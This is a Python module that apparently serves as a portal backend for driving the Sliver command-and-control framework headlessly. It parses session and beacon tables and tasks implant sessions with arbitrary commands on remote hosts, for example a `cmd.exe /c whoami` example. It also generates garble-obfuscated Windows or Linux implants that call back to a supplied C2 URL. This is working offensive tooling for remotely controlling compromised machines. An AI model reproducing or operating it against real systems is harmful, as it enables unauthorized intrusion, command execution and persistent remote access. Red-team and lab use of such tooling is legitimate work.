"""Drive Sliver headlessly (v1.7.7).

Two mechanisms, both verified live against c2stack-sliver-1:

1. `sliver-client console --rc <file>` runs console commands
   non-interactively and prints the result. (Piped stdin does NOT work - the
   console ignores it even under script(1). The rc-file path is what
   bootstrap.sh itself uses.)
2. `sliver-client implant --use <session-id> <command>` tasks a SESSION
   directly with no console at all (e.g. `execute -o whoami`).

Deliberate limits, stated plainly instead of faked:

- `implant --use` accepts SESSION ids only. Beacon ids are rejected
  ("Please select a session or beacon via `use`"), and console-side `use`
  selection is TUI-driven in this version, so beacons are LISTED read-only.
  To task a beacon, open an interactive session from it (console/Kali) or
  generate a `session` implant instead of a `beacon` one.
- `execute` runs the binary directly: no shell, so `>`, `|`, `&&` are
  literal arguments. Wrap shell work in `cmd.exe "/c ..."`.
- Tables have no machine format; columns are sliced by header position.

Nothing here invents data: failures raise BackendError with the real reason
so the portal reports the backend as down instead of showing fake rows.
"""

from __future__ import annotations

import os
import re
import shlex
import shutil
import subprocess
import tempfile
from typing import Any

try:
    from .c2backends import BackendError
except ImportError:
    from c2backends import BackendError

SLIVER_CONTAINER = os.environ.get("SLIVER_CONTAINER", "c2stack-sliver-1")
# Matches CSI / OSC escape sequences the console emits for its banner/colours,
# plus the grpc spinner lines ("| Connecting to ...").
ANSI = re.compile(r"\x1b\[[0-9;?]*[a-zA-Z]|\x1b\][^\x07]*\x07|\x1b[=>]|\x1b[27]K")


def _docker() -> str:
    exe = shutil.which("docker")
    if not exe:
        raise BackendError("docker CLI not available in the portal container")
    return exe


def _clean(raw: bytes) -> str:
    text = raw.decode("utf-8", "replace")
    text = ANSI.sub("", text)
    lines = []
    for line in text.replace("\r", "\n").split("\n"):
        line = line.strip()
        if not line or "Connecting to 127.0.0.1" in line:
            continue
        lines.append(line)
    return "\n".join(lines)


def run_rc(commands: list[str], timeout: int = 90) -> str:
    """Run console commands via an rc file. The `exit` line is appended."""
    body = "".join(f"{c}\n" for c in commands) + "exit\n"
    with tempfile.NamedTemporaryFile("w", suffix=".rc", delete=False) as f:
        f.write(body)
        local = f.name
    remote = "/tmp/portal-%d.rc" % os.getpid()
    try:
        subprocess.run([_docker(), "cp", local, f"{SLIVER_CONTAINER}:{remote}"],
                       capture_output=True, timeout=30, check=True)
        done = subprocess.run(
            [_docker(), "exec", SLIVER_CONTAINER,
             "timeout", str(timeout), "sliver-client", "console",
             "--rc", remote],
            capture_output=True, timeout=timeout + 30, check=False)
    except subprocess.TimeoutExpired as exc:
        raise BackendError(f"sliver console timed out: {exc}") from exc
    except subprocess.CalledProcessError as exc:
        raise BackendError(f"sliver rc setup failed: {exc.stderr[:200]}") from exc
    finally:
        try:
            os.unlink(local)
        except OSError:
            pass
        subprocess.run([_docker(), "exec", SLIVER_CONTAINER, "rm", "-f", remote],
                       capture_output=True, timeout=30)
    out = _clean(done.stdout)
    # In --rc mode there is no interactive banner; what proves the console ran
    # is command output (a table, a result line) or a Sliver error line. An
    # empty/connection-less transcript means it never got there.
    if not out.strip():
        err = _clean(done.stderr)
        raise BackendError(
            "sliver console produced no output "
            f"(stderr: {err[-300:]!r})")
    return out


def _parse_table(out: str, id_keys=("ID",)) -> list[dict[str, str]]:
    """Parse a console table by splitting on multi-space runs.

    Header-position slicing drifts whenever a row's value is wider than its
    header (e.g. a long Remote Address pushes every later column right), so
    columns are split on 2+ spaces instead. Values with single spaces ("Last
    Message", "Remote Address" header itself) survive intact.
    """
    lines = [ln for ln in out.split("\n") if ln.strip()]
    header_idx = None
    for i, ln in enumerate(lines):
        if all(k in ln for k in id_keys) and ("Transport" in ln or "Hostname" in ln):
            header_idx = i
            break
    if header_idx is None:
        if "No sessions" in out or "no sessions" in out.lower():
            return []
        raise BackendError(
            "could not find the table header in console output. "
            f"Tail was: {lines[-6:]!r}")
    labels = re.split(r"\s{2,}", lines[header_idx].strip())
    rows = []
    for ln in lines[header_idx + 1:]:
        if set(ln.strip()) in ({"="}, {"-"}) or "Session ID" in ln:
            continue
        fields = re.split(r"\s{2,}", ln.strip())
        if len(fields) < len(labels):
            # A missing trailing value drops cells; pad so columns keep shape.
            fields += [""] * (len(labels) - len(fields))
        elif len(fields) > len(labels) and "Last Message" in labels:
            # Overflow comes from free text with double spaces (notably the
            # date "Oct  3" inside Last Message): merge the middle back into
            # that column and keep the trailing columns (Health) aligned.
            lm = labels.index("Last Message")
            tail = len(labels) - lm - 1
            fields = (fields[:lm]
                      + [" ".join(fields[lm:len(fields) - tail if tail else None])]
                      + (fields[len(fields) - tail:] if tail else []))
        row = dict(zip(labels, fields))
        sid = row.get("ID", "")
        if not sid or not re.match(r"^[0-9a-f]{6,}$", sid):
            continue
        rows.append(row)
    return rows


def _row_to_session(row: dict[str, str]) -> dict[str, Any]:
    proc = row.get("Process (PID)") or row.get("Process") or ""
    pid = ""
    m = re.search(r"\((\d+)\)\s*$", proc)
    if m:
        pid = m.group(1)
        proc = proc[:m.start()].strip()
    remote = row.get("Remote Address", "")
    health = row.get("Health", "")
    return {
        "id": row.get("ID", ""),
        "backend": "sliver",
        "name": row.get("Name", ""),
        "hostname": row.get("Hostname", "?"),
        "username": (row.get("Username", "?") or "?").strip(),
        "os": row.get("Operating System", "?"),
        "process": proc or "?",
        "pid": pid or "?",
        "transport": row.get("Transport", "?"),
        "remote": remote,
        "last_message": row.get("Last Message", row.get("Last Checkin", "")),
        "is_alive": "ALIVE" in health.upper(),
    }


def sessions() -> list[dict[str, Any]]:
    """Live interactive sessions (beacons need `interactive` first)."""
    try:
        out = run_rc(["sessions"], timeout=90)
    except BackendError as exc:
        raise BackendError(str(exc)) from exc
    return [_row_to_session(r) for r in _parse_table(out)]


def beacons() -> list[dict[str, Any]]:
    """Checked-in beacons (task via an interactive session, not directly)."""
    try:
        out = run_rc(["beacons"], timeout=90)
    except BackendError as exc:
        raise BackendError(str(exc)) from exc
    rows = []
    for r in _parse_table(out):
        s = _row_to_session(r)
        s["next_checkin"] = r.get("Next Checkin", "")
        rows.append(s)
    return rows


def task(session_id: str, command: str, timeout: int = 150) -> dict[str, Any]:
    """Task a SESSION: `execute` runs the binary directly (no shell).

    `command` is split like a shell line, so quoting works, but `>`, `|`
    and `&&` are passed literally. For shell features wrap explicitly, e.g.
    `cmd.exe "/c whoami > C:\\out.txt"`.
    """
    try:
        argv = shlex.split(command, posix=True)
    except ValueError as exc:
        raise BackendError(f"could not parse command: {exc}") from exc
    if not argv:
        raise BackendError("empty command")
    done = subprocess.run(
        [_docker(), "exec", SLIVER_CONTAINER,
         "timeout", str(timeout), "sliver-client", "implant",
         "--use", session_id, "execute", "-o", *argv],
        capture_output=True, timeout=timeout + 30, check=False)
    out = _clean(done.stdout)
    err = _clean(done.stderr)
    blob = out + ("\n" + err if err else "")
    if "Please select a session or beacon" in blob:
        raise BackendError(
            f"sliver has no taskable session {session_id!r} (beacons cannot "
            "be tasked with --use; open an interactive session from the "
            "beacon first)")
    if "no such session" in blob.lower() or "invalid session" in blob.lower():
        raise BackendError(f"sliver rejected session {session_id}: {blob[-300:]}")
    # Output section follows "[*] Output:"; rpc failures surface as rpc error.
    text = out
    if "[*] Output:" in out:
        text = out.split("[*] Output:", 1)[1]
    return {"ok": "rpc error" not in blob.lower(), "backend": "sliver",
            "session_id": session_id, "command": command,
            "output": text.strip()[:8000], "raw": blob.strip()[:2000]}


def generate(kind: str, c2_url: str, target_os: str = "windows",
             arch: str = "amd64", timeout: int = 600) -> dict[str, Any]:
    """Build an implant server-side (`beacon` or `session`).

    Compiles with garble; takes ~40s warm, several minutes cold. The binary
    stays in the sliver container (48 MB is too heavy for a JSON body) and
    the operator fetches it with the printed `docker cp` command.
    """
    if kind not in ("beacon", "session"):
        raise BackendError(f"kind must be beacon|session, got {kind!r}")
    save = f"/tmp/portal-{kind}-{arch}.exe" if target_os == "windows" \
        else f"/tmp/portal-{kind}-{arch}"
    out = run_rc(
        [f"generate {kind} --http {c2_url} --os {target_os} "
         f"--arch {arch} --save {save}"],
        timeout=timeout)
    if "Implant saved to" not in out:
        raise BackendError(f"sliver generate failed: {out[-500:]}")
    return {"ok": True, "backend": "sliver", "kind": kind,
            "container_path": save,
            "retrieve": f"docker cp {SLIVER_CONTAINER}:{save} ./sliver-{kind}.exe",
            "log": out[-1500:]}
